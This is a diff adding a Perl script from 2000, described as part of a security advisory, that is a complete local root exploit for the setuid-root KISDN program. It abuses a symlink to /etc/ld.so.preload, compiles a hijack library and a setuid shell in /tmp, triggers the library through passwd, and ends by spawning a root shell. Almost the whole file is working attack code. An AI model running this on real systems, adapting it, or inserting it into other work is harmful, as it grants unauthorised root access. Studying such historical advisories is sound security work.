@@ -1,0 +1,91 @@
+#!/usr/bin/perl
+
+# KISDN local root
+# (C) 2000 by C-Skills development, Sebastian Krahmer
+# KISDN is suid root (GUI!) and trusts symlinks.
+#
+# This exploit is part of a security-advisory:
+# http://www.cs.uni-potsdam.de/homepages/students/linuxer
+# 
+# BIG greets to:
+#
+# security.is people :)	
+# teso security
+# Mr. Russian Smartass: Fyodor }|-]
+# lam3rz :P
+# Silvio
+# and some auditors from bigger distributors :)
+# (and all i forgot)
+
+# This exploit is for educational purposes only.
+# YOU USE IT AT YOUR OWN RISK!
+# Licensed under the GPL.
+
+# note about these preload-exploits:
+# It is save to run a mc or somewhat on a second terminal, since you won't
+# be able to 'rm' a up-fucked /etc/ld.so.preload! Use F8 on mc then.
+#
+
+print "Warning. You will loose kisdnrc file and /etc/ld.so.preload!\n";
+print "<enter>\n";
+<STDIN>;
+my $rcfile=$ENV{'HOME'}."/.kde/share/config/kisdnrc";
+print "Linking $rcfile...\n";
+unlink $rcfile;
+symlink "/etc/ld.so.preload", $rcfile;
+
+print "Creating hijack-lib ...\n";
+open O, ">/tmp/boom.c" or die "open(boom.c..)";
+print O<<_EOF_;
+#include <sys/types.h>
+
+int time(void *v)
+{
+	chown("/tmp/boomsh", 0, 0);
+	chmod("/tmp/boomsh", 06755);
+	unlink("/etc/ld.so.preload");
+	exit(1);
+}
+_EOF_
+close O;
+
+print "Compiling hijack-lib ...\n";
+$foo = `cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`;
+$foo = `cc -shared /tmp/boom.o -o /tmp/boom.so`;
+
+open O, ">/tmp/boomsh.c" or die "open(boomsh.c ...)";
+print O<<_EOF2_;
+#include <stdio.h>
+int main() 
+{
+    char *a[] = {"/bin/sh", 0};
+    setuid(0); 
+    system("killall -9 kisdn");
+    execve(a[0], a, 0);
+    return 0;
+}
+_EOF2_
+close O;
+
+print "Compile shell...\n";
+$foo = `cc /tmp/boomsh.c -o /tmp/boomsh`;
+
+umask 0;
+
+if (($pid = fork()) == 0) {
+	$foo = `kisdn`;
+	exit(1);
+} 
+print "You don't need to click. Just wait a few seconds.\n";
+sleep(3);
+
+open O, ">/etc/ld.so.preload" or die "Huh? Can't open preload.";
+print O "/tmp/boom.so";
+close O;
+
+$foo = `/usr/bin/passwd`;
+
+# let it look like if we have sth. to do. :)
+sleep 3;
+print "Welcome. But as always: BEHAVE!\n";
+system("/tmp/boomsh");
